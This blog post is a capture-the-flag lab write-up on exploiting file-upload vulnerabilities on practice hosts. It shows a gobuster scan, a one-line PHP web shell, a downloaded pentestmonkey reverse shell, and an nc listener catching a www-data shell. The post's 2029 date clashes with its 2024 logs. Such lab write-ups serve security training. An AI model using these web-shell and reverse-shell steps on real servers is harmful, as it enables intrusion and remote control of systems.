---
layout: post
title:  "Upload Vulnerabilities"
date:   2029-01-24 13:50:01 -0600
categories: Discussions
---

first edit the host file and begin

``` bash
#/bin/sh
echo "10.10.232.106    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm" >> /etc/hosts
```

In the gobuster part
```
gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shell.uploadvulns.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/01/30 00:33:15 Starting gobuster
===============================================================
/REDACTED (Status: 301)
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2024/01/30 01:03:05 Finished
===============================================================
root@ip-10-10-106-1:~# 

```

Get either a web shell or a reverse shell on the machine.
Let's try a web shell first!

I'll create a file webshell.php
```
<?php echo system($_GET["cmd"]);?>
```
After several tries and remembering the path that I got from gobuster
```
view-source:http://shell.uploadvulns.thm/{REDACTED}/webshell.php?cmd=cat%20/var/www/flag.txt
```
But I like the reverse shell better

```
root@ip-10-10-106-1:~# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2024-01-30 01:08:39--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: \u2018php-reverse-shell.php\u2019

php-reverse-shell.p 100%[===================>]   5.36K  --.-KB/s    in 0s      

2024-01-30 01:08:39 (51.5 MB/s) - \u2018php-reverse-shell.php\u2019 saved [5491/5491]

root@ip-10-10-106-1:~# sudo nano php-reverse-shell.php 

```
Then change to my AttackBox IP and port 9000

```
root@ip-10-10-106-1:~# nc -lvnp 9000
Listening on [0.0.0.0] (family 0, port 9000)

```
After figuring out that only 1 web file was loaded, I had to restart the machine and do it again to make it work, but eventually I got:
```
root@ip-10-10-106-1:~# nc -lvnp 9000
Listening on [0.0.0.0] (family 0, port 9000)
Connection from 10.10.120.163 33744 received!
Linux f300b6aced54 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:35:34 up 1 min,  0 users,  load average: 0.62, 0.41, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat /var/www/flag.txt

```